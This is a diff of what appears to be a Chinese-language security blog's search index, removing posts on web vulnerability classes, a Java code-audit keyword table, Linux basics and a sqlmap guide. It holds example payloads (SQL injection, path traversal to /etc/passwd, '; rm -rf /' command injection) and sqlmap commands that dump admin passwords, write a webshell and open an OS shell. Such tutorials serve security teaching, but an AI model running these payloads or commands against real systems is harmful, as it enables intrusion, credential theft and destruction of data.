-<p>假设一个Web应用程序中有一个搜索功能，用户可以通过输入关键字搜索相关内容。如果程序没有对用户输入的关键字进行过滤，攻击者就可以在搜索框中注入恶意的SQL语句，例如：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; OR 1=1; --</span><br></pre></td></tr></table></figure>
-
-<p>这段代码将会被拼接到SQL查询语句中，并使查询语句变为：</p>
-<pre><code>SELECT * FROM articles WHERE title=&#39;&#39; OR 1=1; -- &#39;
-</code></pre>
-<p>攻击者就可以绕过身份验证，获取文章列表中所有文章的信息</p>
-<h1 id="三、文件包含（File-Inclusion）漏洞"><a href="#三、文件包含（File-Inclusion）漏洞" class="headerlink" title="三、文件包含（File Inclusion）漏洞"></a>三、文件包含（File Inclusion）漏洞</h1><p>攻击者利用Web应用程序中存在的文件包含漏洞，向应用程序中注入恶意代码，以获取敏感信息或者执行任意代码。<br><strong>文件包含漏洞示例</strong></p>
-<p>假设一个Web应用程序中有一个功能，允许用户在服务器上查看指定的文件。如果程序没有对用户输入的文件名进行过滤，攻击者就可以通过在URL中注入恶意的文件名来读取任意文件，例如：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/viewfile.php?file=../../../etc/passwd</span><br></pre></td></tr></table></figure>
-
-<p>这段代码将会被拼接到文件路径中，并使程序读取&#x2F;etc&#x2F;passwd文件并将其显示在页面上，攻击者就可以获取敏感信息</p>
-<h1 id="四、CSRF（Cross-Site-Request-Forgery）漏洞"><a href="#四、CSRF（Cross-Site-Request-Forgery）漏洞" class="headerlink" title="四、CSRF（Cross-Site Request Forgery）漏洞"></a>四、CSRF（Cross-Site Request Forgery）漏洞</h1><p>攻击者通过欺骗用户在已经登录的Web应用程序中执行某些操作，从而窃取用户的身份验证信息或者执行任意操作。<br><strong>CSRF漏洞示例</strong></p>
-<p>假设一个Web应用程序中有一个功能，允许用户通过访问URL来删除自己的帖子。如果程序没有进行CSRF防护，攻击者就可以伪造一个带有删除帖子的请求的页面，欺骗用户点击链接，例如：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;http://example.com/deletepost.php?postid=123&amp;action=delete&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>当用户点击该链接时，程序将会执行删除操作，攻击者就可以删除用户的帖子。</p>
-<h1 id="五、认证与授权漏洞"><a href="#五、认证与授权漏洞" class="headerlink" title="五、认证与授权漏洞"></a>五、认证与授权漏洞</h1><p>攻击者通过欺骗或者绕过Web应用程序的身份验证或者授权机制，获取未授权的访问权限或者执行任意操作。</p>
-<p>认证与授权漏洞示例<br>假设一个Web应用程序中的一个页面需要特定的权限才能访问，例如管理员权限。如果程序没有进行足够的身份验证或者授权机制，攻击者就可以绕过该机制，获取管理员权限并执行任意操作。</p>
-<h1 id="六、逻辑漏洞"><a href="#六、逻辑漏洞" class="headerlink" title="六、逻辑漏洞"></a>六、逻辑漏洞</h1><p>攻击者利用Web应用程序中的逻辑漏洞，绕过应用程序的安全措施，获取未授权的访问权限或者执行任意操作。</p>
-<p>逻辑漏洞示例<br>假设一个Web应用程序中的一个功能需要进行支付，用户需要在完成支付后才能获得相应的商品或者服务。如果程序存在逻辑漏洞，例如没有对支付进行验证或者没有对用户状态进行检查，攻击者就可以绕过支付流程，获得相应的商品或者服务，而不需要真正支付<br>七、敏感数据泄露漏洞</p>
-<p>Web应用程序在处理敏感信息时出现漏洞，导致敏感信息泄露。</p>
-<p>敏感数据泄露漏洞示例<br>假设一个Web应用程序中存储了用户的敏感信息，例如信用卡号、社保号码等等。如果程序没有对这些信息进行足够的保护，攻击者就可以通过利用程序的漏洞或者直接攻击数据库等方式获取这些信息。</p>
-<h1 id="八、命令注入（Command-Injection）漏洞"><a href="#八、命令注入（Command-Injection）漏洞" class="headerlink" title="八、命令注入（Command Injection）漏洞"></a>八、命令注入（Command Injection）漏洞</h1><p>攻击者通过在Web应用程序中注入恶意命令，从而获取敏感信息或者执行任意代码.</p>
-<p>命令注入漏洞示例<br>假设一个Web应用程序中有一个命令行操作的功能，例如允许管理员执行一些命令来管理服务器。如果程序没有对用户输入的命令进行过滤，攻击者就可以在命令中注入恶意的代码，例如：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; rm -rf /</span><br></pre></td></tr></table></figure>
-
-<p>这段代码将会被拼接到命令中，并使命令变为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls; rm -rf /</span><br></pre></td></tr></table></figure>
-
-<p>攻击者就可以执行任意代码，删除服务器上的所有文件。</p>
-<p>需要注意的是，以上示例仅仅是每个漏洞类型的一个简单示例，实际的漏洞可能会更加复杂，攻击者也会不断地创造新的攻击方式来绕过应用程序的防御措施。为了确保Web应用程序的安全性，需要开发人员注重代码的安全性，以及定期进行安全测试和漏洞扫描</p>
-<h1 id="审计方法总结"><a href="#审计方法总结" class="headerlink" title="审计方法总结"></a>审计方法总结</h1><p>主要代码审计方法是跟踪用户输入数据和敏感函数参数回溯：跟踪用户的输入数据，判断数据进入的每一个代码逻辑是否有可利用的点，此处的代码逻辑可以是一个函数，或者是条小小的条件判断语句。</p>
-<p>敏感函数参数回溯，根据敏感函数，逆向追踪参数传递的过程。这个方法是最高效，最常用的方法。大多数漏洞的产生是因为函数的使用不当导致的，只要找到这些函数，就能够快速挖掘想要的漏洞。</p>
-<p>以下是基于关键词审计技巧总结：</p>
-<p>在搜索时要注意是否为整个单词,以及小写敏感这些设置</p>
-<table>
-<thead>
-<tr>
-<th align="center">漏洞名称</th>
-<th align="center">关键词</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">密码硬编码、密码明文存储</td>
-<td align="center">password 、pass、jdbc</td>
-</tr>
-<tr>
-<td align="center">XSS</td>
-<td align="center">getParamter、&lt;%&#x3D;、param.</td>
-</tr>
-<tr>
-<td align="center">SQL 注入</td>
-<td align="center">Select、Dao 、from 、delete 、update、insert</td>
-</tr>
-<tr>
-<td align="center">任意文件下载</td>
-<td align="center">download 、fileName 、filePath、write、getFile、getWriter</td>
-</tr>
-<tr>
-<td align="center">任意文件删除</td>
-<td align="center">Delete、deleteFile、fileName 、filePath</td>
-</tr>
-<tr>
-<td align="center">文件上传</td>
-<td align="center">Upload、write、fileName 、filePath</td>
-</tr>
-<tr>
-<td align="center">命令注入</td>
-<td align="center">getRuntime、exec、cmd、shell</td>
-</tr>
-<tr>
-<td align="center">缓冲区溢出</td>
-<td align="center">strcpy,strcat,scanf,memcpy,memmove,memeccpy<br/>Getc(),fgetc(),getchar;read,printf</td>
-</tr>
-<tr>
-<td align="center">XML 注入</td>
-<td align="center">DocumentBuilder、XMLStreamReader、SAXBuilder、SAXParser<br/>SAXSource 、TransformerFactory 、SAXTransformerFactory 、</td>
-</tr>
-<tr>
-<td align="center">反序列化漏洞</td>
-<td align="center">ObjectInputStream.readObject、ObjectInputStream.readUnshared、XMLDecoder.readObject<br/>Yaml.load 、 XStream.fromXML 、 ObjectMapper.readValue 、JSON.parseObject</td>
-</tr>
-<tr>
-<td align="center">url 跳转</td>
-<td align="center">sendRedirect、setHeader、forward</td>
-</tr>
-<tr>
-<td align="center">不安全组件暴露</td>
-<td align="center">activity、Broadcast Receiver、Content Provider、Service、 inter-filter</td>
-</tr>
-<tr>
-<td align="center">日志记录敏感信息</td>
-<td align="center">log log.info logger.info</td>
-</tr>
-<tr>
-<td align="center">代码执行</td>
-<td align="center">eval、system、exec</td>
-</tr>
-</tbody></table>
-<h1 id="其他漏洞审计方法"><a href="#其他漏洞审计方法" class="headerlink" title="其他漏洞审计方法"></a>其他漏洞审计方法</h1><ol>
-<li>CSRF</li>
-</ol>
-<p>审计方法:通过查看配置文件有没有配置 csrf 全局过滤器，如果没有则重点看每个操作前有没有添加 token 的防护机制</p>
-<p>在Smpkpiappealcontroller.java中200处，直接用用ids控制删除操作，而没有添加防 csrf的随机token验证检查，存在csrf漏洞。</p>
-<p> Java&#x2F;main&#x2F;com&#x2F;venustech&#x2F;tsoc&#x2F;cupid&#x2F;smp&#x2F;kpi&#x2F;dao&#x2F;smpkpideclardao.java 517行，对传</p>
-<p>入的ids进行删除操作。</p>
-<ol start="2">
-<li>Struts2 远程代码执行漏洞</li>
-</ol>
-<p>审计方法：查看 struts 插件的版本信息是否为漏洞版本漏洞版本查询网址：<a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></p>
-<ol start="3">
-<li>越权操作</li>
-</ol>
-<p>审计方法：重点关注用户操作请求时查看是否有对当前登陆用户权限做校验从而确定是否存在漏洞，有些厂商会使用一些主流的权限框架，例如 shiro ,spring security 等框架，那么需要重点关注框架的配置文件以及实现方法</p>
-<p>漏洞示例：</p>
-<p>在以下文件中采用了 shiro 框架进行权限控制，在代码 58-72 行处为控制访问路径的权限设置，51-55 行处为对 admin 路径下访问限制，只有 SysyUserFilter 设置了 isAccessAllowed 方法,其他过滤均没有</p>
-<p>SysUserFilter 中 isAccessAllowed 具体实现方法如下，90-93 行处没有对是否为当前用户进行判断，导致了越权</p>
-<p>其他过滤文件均只设置了 onAccessDaniad()方法</p>
-<p>如果没有使用框架的话，就要注意每个操作是否有权限</p>
-<p>代码 7 行处获取 session 里的 username，只判断了 username 是不是为空，如果在截取数据包的时候将 username 再重新赋一个值就有可能造成越权漏洞。</p>
-<p> 以这个年度服务费用编制功能为例，测试一下，代码如图所示：</p>
-<ol start="4">
-<li>会话超时设置</li>
-</ol>
-<p>审计方法：</p>
-<p>Javaweb 应用会话超时设置一般有俩种方法：一是在配置文件 web.xml 设置</p>
-<p> 二是通过 java 代码设置</p>
-<ol start="5">
-<li>敏感数据弱加密</li>
-</ol>
-<p>审计方法：</p>
-<p>敏感数据弱加密主要看数据传输中的加密方法，一般写在工具类 util 中以下文件中为 base64 编码方法</p>
-<p>​	</p>
-<p>​	</p>
-<p>​	</p>
-]]></content>
-      <tags>
-        <tag>Java</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linux</title>
-    <url>/2023/08/09/Linux/</url>
-    <content><![CDATA[<h1 id="Linux操作系统获取方式"><a href="#Linux操作系统获取方式" class="headerlink" title="Linux操作系统获取方式"></a>Linux操作系统获取方式</h1><span id="more"></span>
-
-<p>以centOS为例，获取方法大致分为两种：</p>
-<ul>
-<li><p>从<a href="https://www.centos.org/download/">CentOS官网</a>获取；</p>
-</li>
-<li><p>从镜像网站获取</p>
-<ul>
-<li><p>以</p>
-<p>阿里云镜像</p>
-<p>网站平台为例。</p>
-<ul>
-<li>新版本镜像地址： <a href="https://mirrors.aliyun.com/centos/">https://mirrors.aliyun.com/centos/</a></li>
-<li>旧版本镜像地址： <a href="https://mirrors.aliyun.com/centos-vault/">https://mirrors.aliyun.com/centos-vault/</a></li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h1 id="Linux-接口"><a href="#Linux-接口" class="headerlink" title="Linux 接口"></a>Linux 接口</h1><p>Linux 系统是一种金字塔模型的系统，如下所示</p>
-<p><img src="https://img2020.cnblogs.com/blog/1515111/202010/1515111-20201010070233641-1312039505.png" alt="img"></p>
-<h1 id="Linux常用命令"><a href="#Linux常用命令" class="headerlink" title="Linux常用命令"></a>Linux常用命令</h1><p>pwd 显示工作路径</p>
-<p>shutdown -h now 关闭系统  &#x2F;halt 关闭系统</p>
-<p>shutdown -r now 重启 &#x2F; reboot 重启</p>
-<p>systemctl stop firewalld　　关闭防火墙</p>
-<p>ip addr　　查看ip地址</p>
-<p>1、<strong>cd命令</strong>：这是一个非常基本，也是大家经常需要使用的命令，它用于切换当前目录，它的参数是要切换到的目录的路径，可以是绝对路径，也可以是相对路径。如：</p>
-<p>cd &#x2F;home 　 进入根目录下面的home目录<br>cd home 　 进入当前目录下的home目录<br>cd ..　　　 返回上一层目录<br>cd ..&#x2F;.. 　　 返回上两级目录<br>cd &#x2F;　　　　　返回跟目录<br>cd - 　　　　返回上次所在的目录 </p>
-<p>2、<strong>ls命令</strong>：这是一个非常有用的查看文件与目录的命令，list之意，它的参数非常多，下面就列出一些我常用的参数吧，如下：</p>
-<p>ls 　　　查看目录中的文件<br>ls -a　　列出全部的文件，连同隐藏文件（开头为.的文件）一起列出来<br>ls -l 　 显示文件和目录的详细资料 </p>
-<p>ls A*    意味着只列出以 A 为开头的所有文件</p>
-<p>3、<strong>mkdir命令</strong>：创建</p>
-<p>mkdir dir1 创建一个叫做 ‘dir1’ 的目录’<br>mkdir dir1 dir2 同时创建两个目录 </p>
-<p>4、<strong>rm命令</strong>：删除</p>
-<p>rm -f file1　　 删除一个叫做 ‘file1’ 的文件’<br>rmdir dir1 　　删除一个叫做 ‘dir1’ 的目录’ （空目录才能删除）<br>rm -rf dir1 　　删除一个叫做 ‘dir1’ 的目录并同时删除其内容<br>rm -rf dir1 dir2　　 同时删除两个目录及它们的内容 </p>
-<p>rm A*      会移除所有以 A 为开头的文件而不是只删除文件名是 <code>A*</code> 的文件</p>
-<p>5、<strong>mv命令</strong>：该命令用于移动文件、目录或更名，move之意，它的常用参数如下：-f 如果目标文件已经存在，不会询问而直接覆盖</p>
-<p>mv file1 file2  把文件file1重命名为file2 </p>
-<p>mv file1 file2 dir  把文件file1、file2移动到目录dir中</p>
-<p>6、<strong>cp命令</strong>：该命令用于复制文件，copy之意，它还可以把多个文件一次性地复制到一个目录下， 它的常用参数如下：</p>
-<p>cp -a file1 file2 连同文件的所有特性把文件file1复制成文件file2<br>cp dir&#x2F;* . 复制一个目录下的所有文件到当前工作目录<br>cp -a &#x2F;tmp&#x2F;dir1 . 复制一个目录到当前工作目录<br>cp -a dir1 dir2 复制一个目录 </p>
-<p>7、<strong>find命令</strong>：find是一个基于查找的功能非常强大的命令</p>
-<p>find &#x2F; -name file1 从 ‘&#x2F;‘ 开始进入根文件系统搜索文件和目录<br>find &#x2F; -user user1 搜索属于用户 ‘user1’ 的文件和目录<br>find &#x2F;home&#x2F;user1 -name *.bin 在目录 ‘&#x2F; home&#x2F;user1’ 中搜索带有’.bin’ 结尾的文件<br>find &#x2F;usr&#x2F;bin -type f -atime +100 搜索在过去100天内未被使用过的执行文件<br>find &#x2F;usr&#x2F;bin -type f -mtime -10 搜索在10天内被创建或者修改过的文件 </p>
-<p>8、<strong>ps命令</strong>：该命令用于将某个时间点的进程运行情况选取下来并输出，process之意，它的常用参数如下：</p>
-<p>-A ：所有的进程均显示出来<br>-a ：不与terminal有关的所有进程<br>-u ：有效用户的相关进程<br>-x ：一般与a参数一起使用，可列出较完整的信息<br>-l ：较长，较详细地将PID的信息列出<br>其实我们只要记住ps一般使用的命令参数搭配即可，它们并不多，如下：</p>
-<p>ps aux  查看系统所有的进程数据<br>ps ax  查看不与terminal有关的所有进程<br>ps -lA  查看系统所有的进程数据<br>ps axjf  查看连同一部分进程树状态</p>
-<p>9、<strong>kill命令</strong>：该命令用于向某个工作（%jobnumber）或者是某个PID（数字）传送一个信号，它通常与ps和jobs命令一起使用，它的基本语法如下：</p>
-<p>kill -signal PID<br>signal的常用参数如下：注：最前面的数字为信号的代号，使用时可以用代号代替相应的信号。</p>
-<p>1：SIGHUP，启动被终止的进程<br>2：SIGINT，相当于输入ctrl+c，中断一个程序的进行<br>9：SIGKILL，强制中断一个进程的进行<br>15：SIGTERM，以正常的结束进程方式来终止进程<br>17：SIGSTOP，相当于输入ctrl+z，暂停一个进程的进行<br>例如：</p>
-<p># 以正常的结束进程方式来终于第一个后台工作，可用jobs命令查看后台中的第一个工作进程<br>kill -SIGTERM %1<br># 重新改动进程ID为PID的进程，PID可用ps命令通过管道命令加上grep命令进行筛选获得<br>kill -SIGHUP PID </p>
-<p> 10、<strong>tar命令</strong>：该命令用于对文件进行打包，默认情况并不会压缩，如果指定了相应的参数，它还会调用相应的压缩程序（如gzip和bzip等）进行压缩和解压。它的常用参数如下：</p>
-<ol>
-<li>压缩：tar -jcv -f filename.tar.bz2 要被处理的文件或目录名称 </li>
-<li>查询：tar -jtv -f filename.tar.bz2 </li>
-<li>解压：tar -jxv -f filename.tar.bz2 -C 欲解压缩的目录</li>
-</ol>
-<p>11、chmod命令：该命令用于改变文件的权限，一般的用法如下：</p>
-<p>chmod -R 777   chmod -R 777 意思就是将当前目录及目录下所有文件都给予777权限（所有权限）</p>
-<p><strong>查看文件内容</strong><br>cat file1 从第一个字节开始正向查看文件的内容<br>tac file1 从最后一行开始反向查看一个文件的内容<br>more file1 查看一个长文件的内容<br>less file1 类似于 ‘more’ 命令，但是它允许在文件中和正向操作一样的反向操作<br>head -2 file1 查看一个文件的前两行<br>tail -2 file1 查看一个文件的最后两行<br>tail -f &#x2F;var&#x2F;log&#x2F;messages 实时查看被添加到一个文件中的内容 </p>
-<p><strong>YUM 软件包升级器 - （Fedora, RedHat及类似系统）</strong><br>yum install package_name 下载并安装一个rpm包<br>yum localinstall package_name.rpm 将安装一个rpm包，使用你自己的软件仓库为你解决所有依赖关系<br>yum update package_name.rpm 更新当前系统中所有安装的rpm包<br>yum update package_name 更新一个rpm包<br>yum remove package_name 删除一个rpm包<br>yum list 列出当前系统中安装的所有包<br>yum search package_name 在rpm仓库中搜寻软件包<br>yum clean packages 清理rpm缓存删除下载的包<br>yum clean headers 删除所有头文件<br>yum clean all 删除所有缓存的包和头文件 </p>
-]]></content>
-      <tags>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SQL注入</title>
     <url>/2023/08/04/SQL%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<h2 id="SQL注入入门"><a href="#SQL注入入门" class="headerlink" title="SQL注入入门"></a>SQL注入入门</h2><span id="more"></span>
@@ -3777,376 +3777,6 @@ chmod(&quot;/somedir/somefile&quot;, 0755);
       </tags>
   </entry>
   <entry>
-    <title>Sqlmap</title>
-    <url>/2023/09/03/Sqlmap/</url>
-    <content><![CDATA[<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="sqlmap简介"><a href="#sqlmap简介" class="headerlink" title="sqlmap简介"></a>sqlmap简介</h3><p>sqlmap支持五种不同的注入模式：</p>
-<ul>
-<li>1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。</li>
-<li>2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</li>
-<li>3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</li>
-<li>4、联合查询注入，可以使用union的情况下的注入。</li>
-<li>5、堆查询注入，可以同时执行多条语句的执行时的注入。</li>
-</ul>
-<h3 id="sqlmap支持的数据库有"><a href="#sqlmap支持的数据库有" class="headerlink" title="sqlmap支持的数据库有"></a>sqlmap支持的数据库有</h3><p>MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB</p>
-<h2 id="检测注入"><a href="#检测注入" class="headerlink" title="检测注入"></a>检测注入</h2><h3 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h3><p>sqlmap -u “<a href="http://www.vuln.cn/post.php?id=1%E2%80%9D">http://www.vuln.cn/post.php?id=1”</a></p>
-<p>默认使用level1检测全部数据库类型</p>
-<p>sqlmap -u “<a href="http://www.vuln.cn/post.php?id=1%E2%80%9D">http://www.vuln.cn/post.php?id=1”</a>  –dbms mysql –level 3</p>
-<p>指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面）</p>
-<h3 id="跟随302跳转"><a href="#跟随302跳转" class="headerlink" title="跟随302跳转"></a>跟随302跳转</h3><p>当注入页面错误的时候，自动跳转到另一个页面的时候需要跟随302，<br> 当注入错误的时候，先报错再跳转的时候，不需要跟随302。<br> 目的就是：要追踪到错误信息。</p>
-<h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><p>当程序有防get注入的时候，可以使用cookie注入<br> sqlmap -u “<a href="http://www.baidu.com/shownews.asp%E2%80%9D">http://www.baidu.com/shownews.asp”</a> –cookie “id&#x3D;11” –level 2（只有level达到2才会检测cookie）</p>
-<h3 id="从post数据包中注入"><a href="#从post数据包中注入" class="headerlink" title="从post数据包中注入"></a>从post数据包中注入</h3><p>可以使用burpsuite或者temperdata等工具来抓取post包</p>
-<p>sqlmap -r “c:\tools\request.txt” -p “username” –dbms mysql   指定username参数</p>
-<h2 id="注入成功后"><a href="#注入成功后" class="headerlink" title="注入成功后"></a>注入成功后</h2><h3 id="获取数据库基本信息"><a href="#获取数据库基本信息" class="headerlink" title="获取数据库基本信息"></a>获取数据库基本信息</h3><p>sqlmap -u “<a href="http://www.vuln.cn/post.php?id=1%E2%80%9D">http://www.vuln.cn/post.php?id=1”</a>  –dbms mysql –level 3 –dbs</p>
-<p>查询有哪些数据库</p>
-<p>sqlmap -u “<a href="http://www.vuln.cn/post.php?id=1%E2%80%9D">http://www.vuln.cn/post.php?id=1”</a>  –dbms mysql –level 3 -D test –tables</p>
-<p>查询test数据库中有哪些表</p>
-<p>sqlmap -u “<a href="http://www.vuln.cn/post.php?id=1%E2%80%9D">http://www.vuln.cn/post.php?id=1”</a>  –dbms mysql –level 3 -D test -T admin –columns</p>
-<p>查询test数据库中admin表有哪些字段</p>
-<p>sqlmap -u “<a href="http://www.vuln.cn/post.php?id=1%E2%80%9D">http://www.vuln.cn/post.php?id=1”</a>  –dbms mysql –level 3 -D test -T admin -C “username,password” –dump</p>
-<p>dump出字段username与password中的数据</p>
-<p>其他命令参考下面</p>
-<h3 id="从数据库中搜索字段"><a href="#从数据库中搜索字段" class="headerlink" title="从数据库中搜索字段"></a>从数据库中搜索字段</h3><p>sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password<br> 在dedecms数据库中搜索字段admin或者password。</p>
-<h3 id="读取与写入文件"><a href="#读取与写入文件" class="headerlink" title="读取与写入文件"></a>读取与写入文件</h3><p>首先找需要网站的物理路径，其次需要有可写或可读权限。</p>
-<p>–file-read&#x3D;RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）<br> –file-write&#x3D;WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）<br> –file-dest&#x3D;DFILE 后端的数据库管理系统写入文件的绝对路径<br> #示例：<br> sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest  “e:\php\htdocs\dvwa\inc\include\1.php” –file-write  “f:\webshell\1112.php”</p>
-<p>使用shell命令：</p>
-<p>sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell<br> 接下来指定网站可写目录：<br> “E:\php\htdocs\dvwa”</p>
-<p>#注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）</p>
-<h2 id="sqlmap详细命令："><a href="#sqlmap详细命令：" class="headerlink" title="sqlmap详细命令："></a>sqlmap详细命令：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">–is-dba 当前用户权限（是否为root权限）</span><br><span class="line">–dbs 所有数据库</span><br><span class="line">–current-db 网站当前数据库</span><br><span class="line">–users 所有数据库用户</span><br><span class="line">–current-user 当前数据库用户</span><br><span class="line">–random-agent 构造随机user-agent</span><br><span class="line">–passwords 数据库密码</span><br><span class="line">–proxy http://local:8080 –threads 10 (可以自定义线程加速) 代理</span><br><span class="line">–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）</span><br></pre></td></tr></table></figure>
-
-<h3 id="Options（选项）："><a href="#Options（选项）：" class="headerlink" title="Options（选项）："></a>Options（选项）：</h3><ul>
-<li>–version 显示程序的版本号并退出</li>
-<li>-h, –help 显示此帮助消息并退出</li>
-<li>-v VERBOSE 详细级别：0-6（默认为1）</li>
-<li>保存进度继续跑：</li>
-</ul>
-<p>sqlmap -u “<a href="http://url/news?id=1%E2%80%9C">http://url/news?id=1“</a> –dbs-o “sqlmap.log” 保存进度<br>sqlmap -u “<a href="http://url/news?id=1%E2%80%9C">http://url/news?id=1“</a> –dbs-o “sqlmap.log” –resume 恢复已保存进度</p>
-<h3 id="Target（目标）："><a href="#Target（目标）：" class="headerlink" title="Target（目标）："></a>Target（目标）：</h3><p>以下至少需要设置其中一个选项，设置目标URL。</p>
-<ul>
-<li>-d DIRECT 直接连接到数据库。</li>
-<li>-u URL, –url&#x3D;URL 目标URL。</li>
-<li>-l LIST 从Burp或WebScarab代理的日志中解析目标。</li>
-<li>-r REQUESTFILE 从一个文件中载入HTTP请求。</li>
-<li>-g GOOGLEDORK 处理Google dork的结果作为目标URL。</li>
-<li>-c CONFIGFILE 从INI配置文件中加载选项。</li>
-</ul>
-<h3 id="Request（请求）："><a href="#Request（请求）：" class="headerlink" title="Request（请求）："></a>Request（请求）：</h3><p>这些选项可以用来指定如何连接到目标URL。</p>
-<ul>
-<li>–data&#x3D;DATA 通过POST发送的数据字符串</li>
-<li>–cookie&#x3D;COOKIE HTTP Cookie头</li>
-<li>–cookie-urlencode URL 编码生成的cookie注入</li>
-<li>–drop-set-cookie 忽略响应的Set – Cookie头信息</li>
-<li>–user-agent&#x3D;AGENT 指定 HTTP User – Agent头</li>
-<li>–random-agent 使用随机选定的HTTP User – Agent头</li>
-<li>–referer&#x3D;REFERER 指定 HTTP Referer头</li>
-<li>–headers&#x3D;HEADERS 换行分开，加入其他的HTTP头</li>
-<li>–auth-type&#x3D;ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)</li>
-<li>–auth-cred&#x3D;ACRED HTTP身份验证凭据（用户名:密码）</li>
-<li>–auth-cert&#x3D;ACERT HTTP认证证书（key_file，cert_file）</li>
-<li>–proxy&#x3D;PROXY 使用HTTP代理连接到目标URL</li>
-<li>–proxy-cred&#x3D;PCRED HTTP代理身份验证凭据（用户名：密码）</li>
-<li>–ignore-proxy 忽略系统默认的HTTP代理</li>
-<li>–delay&#x3D;DELAY 在每个HTTP请求之间的延迟时间，单位为秒</li>
-<li>–timeout&#x3D;TIMEOUT 等待连接超时的时间（默认为30秒）</li>
-<li>–retries&#x3D;RETRIES 连接超时后重新连接的时间（默认3）</li>
-<li>–scope&#x3D;SCOPE 从所提供的代理日志中过滤器目标的正则表达式</li>
-<li>–safe-url&#x3D;SAFURL 在测试过程中经常访问的url地址</li>
-<li>–safe-freq&#x3D;SAFREQ 两次访问之间测试请求，给出安全的URL</li>
-</ul>
-<h3 id="Enumeration（枚举）："><a href="#Enumeration（枚举）：" class="headerlink" title="Enumeration（枚举）："></a>Enumeration（枚举）：</h3><p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行<br> 您自己的SQL语句。</p>
-<ul>
-<li>-b, –banner 检索数据库管理系统的标识</li>
-<li>–current-user 检索数据库管理系统当前用户</li>
-<li>–current-db 检索数据库管理系统当前数据库</li>
-<li>–is-dba 检测DBMS当前用户是否DBA</li>
-<li>–users 枚举数据库管理系统用户</li>
-<li>–passwords 枚举数据库管理系统用户密码哈希</li>
-<li>–privileges 枚举数据库管理系统用户的权限</li>
-<li>–roles 枚举数据库管理系统用户的角色</li>
-<li>–dbs 枚举数据库管理系统数据库</li>
-<li>-D DBname 要进行枚举的指定数据库名</li>
-<li>-T TBLname 要进行枚举的指定数据库表（如：-T tablename –columns）</li>
-<li>–tables 枚举的DBMS数据库中的表</li>
-<li>–columns 枚举DBMS数据库表列</li>
-<li>–dump 转储数据库管理系统的数据库中的表项</li>
-<li>–dump-all 转储所有的DBMS数据库表中的条目</li>
-<li>–search 搜索列（S），表（S）和&#x2F;或数据库名称（S）</li>
-<li>-C COL 要进行枚举的数据库列</li>
-<li>-U USER 用来进行枚举的数据库用户</li>
-<li>–exclude-sysdbs 枚举表时排除系统数据库</li>
-<li>–start&#x3D;LIMITSTART 第一个查询输出进入检索</li>
-<li>–stop&#x3D;LIMITSTOP 最后查询的输出进入检索</li>
-<li>–first&#x3D;FIRSTCHAR 第一个查询输出字的字符检索</li>
-<li>–last&#x3D;LASTCHAR 最后查询的输出字字符检索</li>
-<li>–sql-query&#x3D;QUERY 要执行的SQL语句</li>
-<li>–sql-shell 提示交互式SQL的shell</li>
-</ul>
-<h3 id="Optimization（优化）："><a href="#Optimization（优化）：" class="headerlink" title="Optimization（优化）："></a>Optimization（优化）：</h3><p>这些选项可用于优化SqlMap的性能。</p>
-<ul>
-<li>-o 开启所有优化开关</li>
-<li>–predict-output 预测常见的查询输出</li>
-<li>–keep-alive 使用持久的HTTP（S）连接</li>
-<li>–null-connection 从没有实际的HTTP响应体中检索页面长度</li>
-<li>–threads&#x3D;THREADS 最大的HTTP（S）请求并发量（默认为1）</li>
-</ul>
-<h3 id="Injection（注入）："><a href="#Injection（注入）：" class="headerlink" title="Injection（注入）："></a>Injection（注入）：</h3><p>这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。</p>
-<ul>
-<li>-p TESTPARAMETER 可测试的参数（S）</li>
-<li>–dbms&#x3D;DBMS 强制后端的DBMS为此值</li>
-<li>–os&#x3D;OS 强制后端的DBMS操作系统为这个值</li>
-<li>–prefix&#x3D;PREFIX 注入payload字符串前缀</li>
-<li>–suffix&#x3D;SUFFIX 注入payload字符串后缀</li>
-<li>–tamper&#x3D;TAMPER 使用给定的脚本（S）篡改注入数据</li>
-</ul>
-<h3 id="Detection（检测）："><a href="#Detection（检测）：" class="headerlink" title="Detection（检测）："></a>Detection（检测）：</h3><p>这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。</p>
-<ul>
-<li>–level&#x3D;LEVEL 执行测试的等级（1-5，默认为1）</li>
-<li>–risk&#x3D;RISK 执行测试的风险（0-3，默认为1）</li>
-<li>–string&#x3D;STRING 查询时有效时在页面匹配字符串</li>
